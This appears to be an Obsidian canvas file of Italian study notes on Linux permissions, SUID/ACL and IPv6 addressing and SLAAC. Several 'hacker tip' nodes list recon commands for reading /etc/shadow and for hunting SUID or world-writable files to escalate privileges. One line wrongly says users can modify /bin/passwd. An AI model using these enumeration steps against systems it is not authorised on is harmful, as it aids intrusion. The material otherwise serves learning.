**Vuoi ora esplorare le tecniche di privilege escalation per ottenere root?** 😈","x":2820,"y":3894,"width":759,"height":4049},
		{"id":"acec287a5d504ba6","type":"text","text":"💡 **Trucco da hacker:** Puoi usare `pushd` e `popd` per **salvare e ripristinare rapidamente** la tua posizione.\n\n```bash\npushd /etc  # Salva la posizione corrente e vai in /etc\npopd        # Torna alla directory precedente\n```\n\n### **🔎 `which`, `whereis`, `type` - Trovare comandi**\n\n```bash\nwhich ls  # Percorso del comando 'ls'\nwhereis ls  # Mostra anche il manuale e i binari collegati\ntype ls  # Dice se è un comando built-in o esterno\n```\n\n💡 **Perché `cd` non ha un percorso?** Perché è un comando **interno** alla shell!\n\n---\n\n## **📜 5. Leggere File Importanti del Sistema**\n\n### **🛠 File fondamentali in `/etc`**\n\n- `/etc/passwd` → Utenti del sistema\n- `/etc/shadow` → Password criptate degli utenti\n- `/etc/hosts` → Mappatura IP ↔ Hostname\n- `/etc/fstab` → File system montati all'avvio\n\n```bash\ncat /etc/passwd  # Mostra utenti\ncat /etc/shadow  # Richiede permessi di root (password criptate)\ncat /etc/hosts  # Controlla domini personalizzati\n```\n\n---\n\n## **💣 6. Tecniche Avanzate e Trucchi da Hacker**\n\n🔹 **Montare filesystem manualmente**\n\n```bash\nmount /dev/sdb1 /mnt  # Monta una partizione\numount /mnt  # Smonta la partizione\n```\n\n💡 **Utile se trovi un disco USB e vuoi esplorarne il contenuto senza autorun.**\n\n🔹 **Controllare i processi e il filesystem in `/proc`**\n\n```bash\nls -l /proc/[PID]  # Esplora i dettagli di un processo specifico\ncat /proc/mounts  # Vedi i filesystem montati\n```\n\n💡 **Il `/proc` non è un filesystem reale, ma un’interfaccia per il kernel!**\n","x":1820,"y":3894,"width":759,"height":1182},
		{"id":"049e5ead3118c000","type":"text","text":"# Permessi Speciali & Access Control List (ACL)","x":1820,"y":-166,"width":759,"height":958},
		{"id":"52300a2aca6a3d2b","type":"text","text":"# Significato dei Permessi\n\nÈ chiaro cosa significa leggere, scrivere ed eseguire un `file`. Ma con una `directory`?","x":1820,"y":-1249,"width":759,"height":847},
		{"id":"6b842ede32ad3004","type":"text","text":"\n### **📌 Opzioni avanzate**\n\n|Comando|Descrizione|\n|---|---|\n|`find /home -iname \"*.jpg\"`|Cerca **tutti i file `.jpg`** ignorando maiuscole/minuscole.|\n|`find /var/log -type f`|Cerca solo **file** (`-type f`).|\n|`find /etc -type d`|Cerca solo **directory** (`-type d`).|\n|`find /tmp -size +100M`|Trova file **più grandi di 100MB**.|\n|`find /var/log -mtime -7`|Trova file **modificati negli ultimi 7 giorni**.|\n|`find /var/www -user www-data`|Trova file **di un certo utente**.|\n|`find /bin -perm 4000`|Trova file con **SUID bit attivo** (potenziali escalation di privilegi!).|\n\n\nSUID??? (SetUID?) - before executing will change...? `passwd` è l'unico programma che può cambiare le password. in pratica se lo eseguo lancia un processo il cui owner non sono io, ma `root`. Quindi dentro il programma `passwd` sono root senza password? Sì, ma è una cosa super safe e super testata, quindi è difficile sfruttarlo per escalation di privilegi. Ma in linea di principio è possibile.\n\nshadow è il gruppo che può vedere le password. in `/etc/shadow` ci stanno le password, e ha permessi molto stringenti (`640`). \n\n# VEDI PERMESSI MI SA","x":880,"y":-1161,"width":759,"height":759},
		{"id":"f7c41a409788e240","type":"text","text":"## **📜 5. Controllare i Permessi con ACL (Access Control List)**\n\nACL permette di **assegnare permessi più dettagliati** oltre ai classici `rwx`.\n\n### **🛠 Controllare e impostare ACL**\n\n```bash\ngetfacl file.txt  # Vedi permessi ACL di un file\nsetfacl -m u:utente:rwx file.txt  # Aggiungi permessi a un utente specifico\nsetfacl -m g:gruppo:r file.txt  # Aggiungi permessi a un gruppo\nsetfacl -x u:utente file.txt  # Rimuove un permesso ACL\n```\n\n💡 **Hacker Tip:**  \nAlcuni file sembrano \"normali\" con `ls -l`, ma potrebbero avere ACL che permettono **accessi nascosti**. Controllali sempre con `getfacl`.\n\n## **🔎 7. Trovare File con Permessi Pericolosi**\n\nSe hai accesso root, puoi **scansionare il sistema** per cercare file con permessi strani:\n\n🔍 **File eseguibili da chiunque (rischiosi!)**\n\n```bash\nfind / -type f -perm 777\n```\n\n🔍 **File con SetUID (possibile escalation di privilegi)**\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n🔍 **File di configurazione scrivibili da chiunque (pericoloso!)**\n\n```bash\nfind /etc -type f -perm -o+w\n```\n\n","x":880,"y":-268,"width":759,"height":849},
		{"id":"a3d0c899feed67f8","type":"text","text":"\n|Bit|Simbolo|Effetto|\n|---|---|---|\n|**SetUID**|`s` al posto della `x` (es. `rwsr-xr-x`)|Il file viene eseguito con i permessi del **proprietario**, non dell’utente attuale.|\n|**SetGID**|`s` al posto della `x` nel gruppo (es. `rwxr-sr-x`)|Il file viene eseguito con il gruppo del proprietario, non quello dell’utente attuale.|\n|**Sticky Bit**|`t` al posto della `x` negli altri (es. `rwxrwxr-t`)|Solo il **proprietario** può eliminare/modificare i file in una directory condivisa.|\n\n🔍 **Esempi pratici:**\n\n```bash\nchmod u+s script.sh  # Imposta SetUID (esecuzione come proprietario)\nchmod g+s script.sh  # Imposta SetGID (esecuzione con gruppo del file)\nchmod +t /tmp        # Imposta Sticky Bit (protegge i file da cancellazioni altrui)\n```\n\n💡 **Hacker Tip:**\n\n- Se trovi un file **SetUID root**, può essere **un’arma potente**.\n    \n    ```bash\n    find / -perm -4000 2>/dev/null\n    ```\n    \n    **Esempio:** `/bin/passwd` ha il bit **SetUID**, quindi anche un utente normale può modificarlo!\n- **Sticky Bit** è usato in `/tmp` per evitare che utenti cancellino file altrui.\n","x":880,"y":646,"width":759,"height":649},
		{"id":"446577bee9616f15","x":-8220,"y":9618,"width":759,"height":1353,"type":"text","text":"# IPv6 II - 14/03\n\nmulticast\n- assigned - per protocolli x (qualsiasi indirizzo che inizia per `FF`)\n- solicited - ICMPv6 sostituisce ARP (che usa broadcast) con neighbour discovery. 24 bit per gli hosts\n\nunicast\n- global unicast - `2000::/3` significa che i primi 4 bit sono `0010`. Questo significa che gli indirizzi di global unicast iniziano con i ***bit*** `001`, quindi il primo quartetto di ***bit*** è `2 (0010)` o `3 (0011)`. Quindi il primo quartetto di ***hex*** va da `2000` a `3FFF`.\n\t- il global unicast rappresenta 1/8 del totale degli indirizzi! un'altra fetta di torta è divisa tra tutti gli altri \"protocolli\", il resto è inutilizzato;\n\t- Dico un ottavo perché con `/3` bit conti fino ad 8. Con la stessa logica un gruppo `/10` è un $2^{10}$-esimo del totale.\n\t- fanno sostanzialmente le veci degli indirizzi pubblici in IPv4\n- unique local - `FC00::/7` - corrispondono agli indirizzi privati in IPv4 (192.168.x.x, ...).\n\nil source IPv6 è sempre unicast, la destinazione qualsiasi (obv).\n\n`2001:DB8::/32` sono usati per giocare, mai su internet\n\nglobal routing prefix (la parte di rete), subnet ID, interface (host) - rule 3 1 4: incrementa di 1 il quarto quartetto di hex e cambierai sottorete entro la stessa rete\n\ne comunque è diviso a metà tra rete e host\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)\n\n##### link-local\n\nlink-local è solo entro rete/sottorete (tipo il MAC, infatti sei costretto ad averne almeno uno). Non attraversano il router. Pertanto, devono essere unici entro la rete (...come gli indirizzi privati. ma allora cosa cambia con unique local???). range da `FE80` a `FEBF`.\n\nPer questo qualsiasi interfaccia IPv6 ha sempre un indirizzo associato che inizia con `fe80` o simili entro range. `fe80` è self assigned, altrimenti gli altri sono per applicazioni specifiche. Tipicamente dopo `fe80` gli altri N sono tutti 0. Ma come genero una roba unica?\n\n- EUI-64 genera un IPv6 basandosi sulla NIC (tipo sul suo MAC, che in teoria è unico. OUI sono vendor-specifici e Device... sono per il device). Aggiunge `FFFE` in mezzo al mac, se lo vedo so che è EUI-64. poi flippa il 7mo bit (\"don't ask why\");\n- random (su 64 bit è improbabile fare la stessa scelta... speriamo!). Molti SO fanno così\n\naltrimenti manuale (common practice for routers).\n\nquesto link-local è cruciale per assegnare un global unicast address con il protocollo SLAAC (self assignment within the network): quando mi connetto, il router mi manda al link local un messaggio tipo `ciao, sono il gateway, auto-assegnati un ipv6 globale pls`. In pratica questo sostituisce DHCP.\n\n- riassumendo: mi connetto e mi auto-assegno un ip link-local ipotizzando sia unico (probabile). il router mi vede e si presenta, dicendomi che voglio comunicare con l'esterno devo passare da lui, ma in caso mi devo  assegnare un indirizzo globale."},
		{"id":"9338dce122e9b7bf","type":"text","text":"# Indirizzi IPv6 (Reti)\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web ha indirizzo fisso). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.\n\n\"IPFS (Interplanetary Filesystem), molto carino per applicazioni p2p.\"","x":-7320,"y":9120,"width":790,"height":691,"color":"4"},
		{"id":"3a18d8b86987743d","x":-8220,"y":11040,"width":759,"height":540,"type":"text","text":"# SLAAC (find link local)\n\nFunziona su ICMPv6 (application layer) al posto di ARP (IP addresses over ethernet, na roba strana). è un neighbor discovery.\n\n- router\n\t- solicitation - quello che ho scritto prima, quando mi connetto dico un `hey (to all routers): chi è il router?` (tramite un indirizzo multicast, `FF02::1`, `all ipv6 devices in the local link`, l'info è in quell'`1` finale) CREDO\n\t- advertisement (RA) - il router risponde `io, entro questo prefisso di rete scegli l'host che vuoi, diventerà il tuo global unicast`\n- neighbor - solicitation e advertisiment è identico ad ARP. in pratica ho il global unicast ma vedo che è nella mia rete. quindi mi serve il link local. è identico ad ARP, link local è il mac e il global è l'ip4;\n\t- quindi che cambia? neighbor solicitation fa multicast (che in pratica è broadcast sulla rete locale???)\n- redirect\n\nin ogni caso l'advertising router diventa il default gateway\n"},
		{"id":"8599a82797877dbd","x":-8960,"y":11040,"width":580,"height":575,"type":"text","text":"# assign global unicast\n\n- manuale - chiaro\n- dynamic - su IPv4 si fa con DHCP. Qua si può fare in due modi:\n\t- stateful i.e. conosco la distribuzione degli indirizzi (DHCPv6). Quindi c'è un server che sa.\n\t\t- c'è prefix delegation per farsi assegnare un'intera rete invece di un unico coso globale\n\t- stateless, i.e. non li conosco e non mi interessano (SLAAC)\n\t- esiste metodo ibrido SLAAC + DHCPv6, dice che si usa con DNS locale per cose entro la rete (?)\n\n\n1. SLAAC (vedi SLAAC, slide 63 i rossi sono uguali perché generati allo stesso modo)\n\t1. e che succede se scegliamo lo stesso IPv6? duplicate address detection: se nessuno risponde alla mia neighbor solicitation con l'IP che voglio scegliere, allora lo scelgo\n2. router as DHCP server - identico ma cambiano delle flag (vedi rec, sta correndo un po') - you take the ip you want but look for DNS (?)\n3. solo DHCP (come IPv4)."},
		{"id":"f8f784a5228df460","x":-8960,"y":11680,"width":580,"height":420,"type":"text","text":"# Prefix Delegation\n\nstessa cosa di prima, ma chiedo N indirizzi. fatto in genere dai router che sanno di avere degli hosts dietro (anche io posso essere il router della mia casa domotica, per esempio). Faccio prefix delegation request.\n\nRA = Router Advertisement\n\nva le veci di IANA tipo"}
	],
	"edges":[
		{"id":"428ec3c727bcfebf","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"8603be4ae948e472","toSide":"bottom"},
		{"id":"0f8ae08f684e1ba4","fromNode":"22dfa299c258426a","fromSide":"left","toNode":"4282f1f0f685c1b7","toSide":"right"},
		{"id":"3b8450f5d7d06324","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"eab759960ddcf808","toSide":"bottom"},
		{"id":"b97dacf49ed55fcb","fromNode":"0f2a36c9dcf84a3e","fromSide":"right","toNode":"7b351e91b16f865e","toSide":"left"},
		{"id":"1eec059325077352","fromNode":"7b351e91b16f865e","fromSide":"top","toNode":"22dfa299c258426a","toSide":"bottom","label":"How to get there?"},
		{"id":"cdbb7c68033e5b65","fromNode":"7b351e91b16f865e","fromSide":"bottom","toNode":"1cdecb81c364493b","toSide":"top","label":"Where am I?"},
		{"id":"c13c78293edc7b6d","fromNode":"7b351e91b16f865e","fromSide":"right","toNode":"ea0a31adef225299","toSide":"left"},
		{"id":"bda9d6a558058968","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"d8bd274b8f96df69","toSide":"bottom"},
		{"id":"3d3d010e414423c8","fromNode":"ea0a31adef225299","fromSide":"bottom","toNode":"04825a06a9d94d59","toSide":"top"},
		{"id":"835b74485d5e93bb","fromNode":"339d53393538d01d","fromSide":"top","toNode":"28ffaf4f75ea584b","toSide":"bottom"},
		{"id":"f41489a2e2acda82","fromNode":"28ffaf4f75ea584b","fromSide":"left","toNode":"c43c09b5a27c6f80","toSide":"top"},
		{"id":"cb82c94245165cc9","fromNode":"339d53393538d01d","fromSide":"left","toNode":"c43c09b5a27c6f80","toSide":"right"},
		{"id":"6ba4b4daaae0441c","fromNode":"ea0a31adef225299","fromSide":"right","toNode":"625ede0e186681f5","toSide":"left"},
		{"id":"5359adb1693d9726","fromNode":"d8bd274b8f96df69","fromSide":"right","toNode":"4e494b0e134ff4a7","toSide":"left"},
		{"id":"f9071934d54f1998","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e5c67dbcd146b146","fromNode":"04825a06a9d94d59","fromSide":"bottom","toNode":"3d73dc291ec51cb6","toSide":"top"},
		{"id":"38de5c3f0b17d32d","fromNode":"3d73dc291ec51cb6","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"66a677d308a98e43","fromNode":"04825a06a9d94d59","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"c00a9d792bd09d56","fromNode":"efbeb23d6fccc658","fromSide":"bottom","toNode":"592cc115c760d58b","toSide":"top"},
		{"id":"4c7f78114b7c8129","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e3085dcdb384f960","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b008c9c94e60d49d","toSide":"bottom"},
		{"id":"5de8114eb7808ca7","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b3872fe16b478ecb","toSide":"bottom"},
		{"id":"620010ae0292ff42","fromNode":"b3872fe16b478ecb","fromSide":"top","toNode":"db8524057030a7aa","toSide":"bottom"},
		{"id":"30a1708adf9120a5","fromNode":"db8524057030a7aa","fromSide":"left","toNode":"1e4bdb54f9ff41bb","toSide":"right"},
		{"id":"7bbfe86e354e11ed","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9d6e1bc42fdc8fff","toSide":"left"},
		{"id":"b68568742b046ca0","fromNode":"9353a581758bae87","fromSide":"top","toNode":"9d6e1bc42fdc8fff","toSide":"bottom"},
		{"id":"14a1a2a060a23607","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9353a581758bae87","toSide":"left"},
		{"id":"3b09bf2c29cee2c5","fromNode":"db8524057030a7aa","fromSide":"top","toNode":"725abded725d4498","toSide":"bottom"},
		{"id":"ab9bccd43d4b692d","fromNode":"b008c9c94e60d49d","fromSide":"right","toNode":"2d903151dad0b196","toSide":"left"},
		{"id":"f20c7728e211c431","fromNode":"4e494b0e134ff4a7","fromSide":"right","toNode":"2e2f2fffcb29a514","toSide":"left"},
		{"id":"30acbdd63f807416","fromNode":"4e494b0e134ff4a7","fromSide":"bottom","toNode":"7be47aaf1eeeeb0d","toSide":"top"},
		{"id":"9b1ddf1a628d2da5","fromNode":"625ede0e186681f5","fromSide":"right","toNode":"19241c3faaf980ec","toSide":"left"},
		{"id":"16c1578973d5ed8d","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"2e2f2fffcb29a514","toSide":"bottom"},
		{"id":"a11cccead9f2dfe0","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"d6df1ebc088bc55b","toSide":"top"},
		{"id":"3f43813ae6dda381","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"fde5e59d70e6ddbe","toSide":"top"},
		{"id":"97e49f4ab1d118a3","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"28c7fa5a4a2add1f","toSide":"top"},
		{"id":"3e74ea0b969c67d7","fromNode":"28c7fa5a4a2add1f","fromSide":"bottom","toNode":"09449e1e2bf4e019","toSide":"top"},
		{"id":"f0318b1cdc3881bc","fromNode":"19241c3faaf980ec","fromSide":"right","toNode":"22b8634d71376455","toSide":"left"},
		{"id":"00741801b9d873d6","fromNode":"2e2f2fffcb29a514","fromSide":"right","toNode":"df5e2abc8ea4b780","toSide":"left"},
		{"id":"66c11ba53c554d96","fromNode":"22b8634d71376455","fromSide":"top","toNode":"3565595bf897b446","toSide":"bottom"},
		{"id":"05456b6d30048acb","fromNode":"22b8634d71376455","fromSide":"top","toNode":"603628298b4df9a2","toSide":"bottom"},
		{"id":"7dd25d49892a4964","fromNode":"d6df1ebc088bc55b","fromSide":"right","toNode":"0e6f99d9025a7954","toSide":"left"},
		{"id":"d82539944e94e697","fromNode":"22b8634d71376455","fromSide":"top","toNode":"c77fc76ca3f24940","toSide":"bottom"},
		{"id":"56fd97094b3cb634","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"5cce19db2eacb68d","toSide":"bottom"},
		{"id":"9591b59f3b3be6dc","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"ea6a4509f0ba551c","toSide":"bottom"},
		{"id":"448ea8b3e69ae08a","fromNode":"22b8634d71376455","fromSide":"bottom","toNode":"0e6f99d9025a7954","toSide":"top"},
		{"id":"1d3ca92424cf2fb9","fromNode":"339d53393538d01d","fromSide":"bottom","toNode":"3d311ec1479c022e","toSide":"top"},
		{"id":"9c76840620f17956","fromNode":"339d53393538d01d","fromSide":"right","toNode":"1aee8251fddfc28d","toSide":"left"},
		{"id":"0b4c99f1611476ca","fromNode":"1aee8251fddfc28d","fromSide":"bottom","toNode":"3d311ec1479c022e","toSide":"right"},
		{"id":"161a7c928acb4651","fromNode":"1aee8251fddfc28d","fromSide":"bottom","toNode":"399d0f8bfe3f80d5","toSide":"top"},
		{"id":"d5b173cc1ea1a05f","fromNode":"6033fbd5014b0cba","fromSide":"bottom","toNode":"e5fc1848775e11e1","toSide":"top"},
		{"id":"d2867fa074cc0ebe","fromNode":"e5fc1848775e11e1","fromSide":"bottom","toNode":"213cb7424970c6c4","toSide":"top"},
		{"id":"da1a242db5c97fe8","fromNode":"213cb7424970c6c4","fromSide":"left","toNode":"339d53393538d01d","toSide":"right"},
		{"id":"5cda0cd9571b9d0a","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"e660a0288c5cee37","toSide":"right"},
		{"id":"6d86ee83c255b737","fromNode":"e218e0589f82e95a","fromSide":"top","toNode":"0f2a36c9dcf84a3e","toSide":"bottom"},
		{"id":"87735d418c09fb25","fromNode":"e660a0288c5cee37","fromSide":"left","toNode":"c61155df72f8f47a","toSide":"right"},
		{"id":"386d6a68c92c107b","fromNode":"e660a0288c5cee37","fromSide":"bottom","toNode":"f4f2a29153e51075","toSide":"top"},
		{"id":"59c22fe6415ef2b2","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"f4f2a29153e51075","toSide":"right"},
		{"id":"6da1470c749a896e","fromNode":"c61155df72f8f47a","fromSide":"bottom","toNode":"430d8b04ba92b85a","toSide":"top"},
		{"id":"519ba9f70daa64c7","fromNode":"d8bd274b8f96df69","fromSide":"top","toNode":"26065c6695f63b89","toSide":"bottom"},
		{"id":"33a4a2d848107c08","fromNode":"26065c6695f63b89","fromSide":"right","toNode":"b3872fe16b478ecb","toSide":"left"},
		{"id":"91e29291668527bf","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"52300a2aca6a3d2b","toSide":"right"},
		{"id":"98012f482a86c47c","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"049e5ead3118c000","toSide":"right"},
		{"id":"f017850183ea481f","fromNode":"399d0f8bfe3f80d5","fromSide":"bottom","toNode":"446577bee9616f15","toSide":"top"},
		{"id":"7ae20d6cc93f45b0","fromNode":"8599a82797877dbd","fromSide":"bottom","toNode":"f8f784a5228df460","toSide":"top"}
	]
}